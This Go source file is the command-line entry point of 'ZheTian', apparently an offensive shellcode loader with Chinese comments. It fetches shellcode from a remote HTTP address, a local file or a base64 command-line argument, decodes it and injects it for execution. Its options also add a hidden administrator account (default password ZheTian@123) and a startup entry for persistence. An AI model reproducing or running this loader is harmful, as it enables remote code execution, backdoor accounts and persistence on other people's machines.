package server

import (
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/spf13/cobra"
	"os"
)

var (
	Uri           string //远程资源路径
	FilePath      string //本地资源路径
	Resource      string //源文件
	ShellCodeByte []byte //shellcode二进制
	UserName      string //用户名
	PassWD        string //密码
	StartMenu     bool   //是否添加启动项
	CommLineCode  string //直接在命令行输入shellcode
	rootCmd       = &cobra.Command{
		Use:   "ZheTian",
		Short: "http://github.com/yqcs/ZheTian",
		RunE: func(cmd *cobra.Command, args []string) error {
			err := startService()
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			return nil
		},
	}
)

//初始化
func init() {
	//获取远程地址
	rootCmd.PersistentFlags().StringVarP(&Uri, "Uri", "u", "", "HTTP service address hosting shellCode byte file")
	//读取本地地址
	rootCmd.PersistentFlags().StringVarP(&FilePath, "FilePath", "r", "", "Read from local byte file")
	//是否开机自启，默认false，为true则开机自启
	rootCmd.PersistentFlags().BoolVarP(&StartMenu, "Open", "o", false, "Add to startup item")
	//向系统添加管理员用户，需联动-p参数设置密码
	rootCmd.PersistentFlags().StringVarP(&UserName, "UserName", "n", "", "Add user to Administrators group.The default password is ZheTian@123 (Execute with administrator permissions)")
	//添加用户的密码，需联动-n参数
	rootCmd.PersistentFlags().StringVarP(&PassWD, "PassWD", "p", "", "User Password. Must use -n param")
	//读取本地没有修改过的原始payload。
	rootCmd.PersistentFlags().StringVarP(&Resource, "Payload Resource", "s", "", "Read payload source file,Supported lang:java、C、python、ruby、c#、perl、ruby...")
	//从命令行读取base64字符串 如：ZheTian.exe -s xsa15as4d5a4das...
	rootCmd.PersistentFlags().StringVarP(&CommLineCode, "Command line input ShellCode", "c", "", "Enter the base64 string into the command line")

}

//Execute 挂载cli，等待执行
func Execute() {
	if len(os.Args) == 1 {
		fmt.Println("\nRun command: ZheTian -h")
		os.Exit(0)
	}
	if err := rootCmd.Execute(); err != nil {
		panic(err.Error())
	}
}

//shellcode格式：
//java类型需去除0x
//c or python 类型需去除\x
//示例：fc4883e4f0e8c8000000415141
func startService() error {

	//添加用户
	if UserName != "" {
		if len(UserName) <= 6 || len(PassWD) <= 6 {
			fmt.Println("账户名与密码的长度需大于6位")
			os.Exit(1)
		}
		if err := NetUserAdd(UserInfo{
			UserName, PassWD,
		}); err != nil {
			//如果失败也不退出程序，继续执行shellcode。除非发生panic
			fmt.Println(err.Error())
		}
	}

	//只能选择一个参数
	//默认选择第一条参数
	if Uri != "" {
		UriModel()
	} else if FilePath != "" {
		ReadFileModel()
	} else if Resource != "" {
		ResourceModel()
	} else if CommLineCode != "" {
		CommLineModel()
	}

	//添加开机自启。必须
	if StartMenu {
		StartUp()
	}

	//将base64转字符串
	decodeBytes, err := base64.StdEncoding.DecodeString(string(ShellCodeByte))
	if err != nil {
		return errors.New(err.Error())
	}

	//执行shellCode
	//将获取到的hex进行解码，转成二进制数组
	shellCode, err := hex.DecodeString(string(decodeBytes))
	if err == nil {
		Inject(shellCode)
	}
	return errors.New(err.Error())
}
